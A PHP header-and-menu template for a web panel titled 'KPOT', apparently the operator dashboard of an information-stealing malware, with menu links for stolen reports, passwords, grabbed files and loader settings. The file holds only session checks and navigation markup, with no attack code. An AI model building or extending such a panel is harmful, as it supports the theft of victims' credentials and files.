<?php
    session_start();
    if (!isset($_SESSION['username'])) header("Location: login.php");
?>

<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
<link rel="stylesheet" type="text/css" href="css/circle.css" />
<link rel="stylesheet" type="text/css" href="css/stylesheet.css" />
<script type="text/javascript" src="js/jquery-3.3.1.min.js"></script>


<title>
    KPOT
</title>
<meta charset="utf-8"/>


<div class="header">
	<a href="index.php">
	<img src="img/header-logotype.png" class="header-logotype">
    </a>
</div>

<div class="col-md-3">
	<div class="menu">
		<div class="hr"></div>

		<a href="index.php" class="menu-link <?php if ($type == 'index') echo 'menu-active'; ?>">Home Page</a>
        <a href="reports.php" class="menu-link <?php if ($type == 'reports') echo 'menu-active'; ?>">Reports List</a>
		<a href="passwords.php" class="menu-link <?php if ($type == 'passwords') echo 'menu-active'; ?>">Passwords</a>
        <a href="filegrabber.php" class="menu-link <?php if ($type == 'filegrabber') echo 'menu-active'; ?>">Files Grabber</a>
        <a href="loader.php" class="menu-link <?php if ($type == 'loader') echo 'menu-active'; ?>">Loader settings</a>
        <a href="settings.php" class="menu-link <?php if ($type == 'settings') echo 'menu-active'; ?>">Settings</a>
        <a href="logout.php" onclick="return confirm('Confirm going out?');" class="menu-link">Sign off</a>
	</div>
</div>